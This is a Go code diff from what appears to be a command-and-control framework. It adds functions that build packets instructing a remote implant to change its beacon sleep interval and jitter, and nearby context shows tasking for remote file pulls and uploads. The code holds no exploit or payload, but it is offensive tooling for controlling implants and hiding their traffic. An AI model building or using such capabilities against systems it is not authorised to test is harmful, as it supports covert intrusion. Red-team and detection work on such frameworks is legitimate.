@@ -157,6 +157,28 @@ func ProcessList() *com.Packet {
 	return &com.Packet{ID: MvProcList}
 }
 
+// Jitter returns a set Session jitter Packet. This can be used to instruct the
+// client to update it's jitter value to the specified 0-100 percentage.
+//
+// Anything greater than 100 will be capped to 100 and anything less than zero
+// (except -1) will be set to zero. Values of -1 are ignored. This setting will
+// NOT override the Sleep setting.
+//
+// IT IS RECOMMENDED TO USE THE 'Session.Jitter' CALL INSTEAD TO PREVENT DE-SYNC
+// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      int8   // Jitter
+//      uint64 // Sleep (0 for this)
+//  Output:
+//      <none>
+func Jitter(j int) *com.Packet {
+	return Duration(0, j)
+}
+
 // Cwd returns a change directory Packet. This can be used to instruct the
 // client to change from it's current working directory to the directory
 // specified.
@@ -364,6 +386,27 @@ func Copy(src, dst string) *com.Packet {
 //      uint64 // Byte Count Written
 func Pull(url, path string) *com.Packet {
 	return PullAgent(url, "", path)
+}
+
+// Sleep returns a set Session sleep Packet. This can be used to instruct the
+// client to update it's sleep value to the specified duration.
+//
+// Anything less than or equal to zero is ignored! This setting will NOT override
+// the Jitter setting.
+//
+// IT IS RECOMMENDED TO USE THE 'Session.Sleep' CALL INSTEAD TO PREVENT DE-SYNC
+// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      int8   // Jitter (-1 for this)
+//      uint64 // Sleep
+//  Output:
+//      <none>
+func Sleep(d time.Duration) *com.Packet {
+	return Duration(d, -1)
 }
 
 // ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
@@ -622,6 +665,34 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 	n, err := UploadReader(dst, f)
 	f.Close()
 	return n, err
+}
+
+// Duration returns a set Session sleep and/or jitter Packet. This can be used
+// to instruct the client to update it's sleep and jitters value to the specified
+// duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
+// anything <=0 for Sleep).
+//
+// For Sleep, anything less than or equal to zero is ignored!
+//
+// For Jitter, anything greater than 100 will be capped to 100 and anything less
+// than zero (except -1) will be set to zero. Values of -1 are ignored.
+//
+// IT IS RECOMMENDED TO USE THE 'Session.Duration' CALL INSTEAD TO PREVENT DE-SYNC
+// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      int8   // Jitter
+//      uint64 // Sleep
+//  Output:
+//      <none>
+func Duration(d time.Duration, j int) *com.Packet {
+	n := &com.Packet{ID: MvTime}
+	n.WriteInt8(int8(j))
+	n.WriteUint64(uint64(d))
+	return n
 }
 
 // ProxyReplace returns an replace Proxy Packet. This can be used to instruct
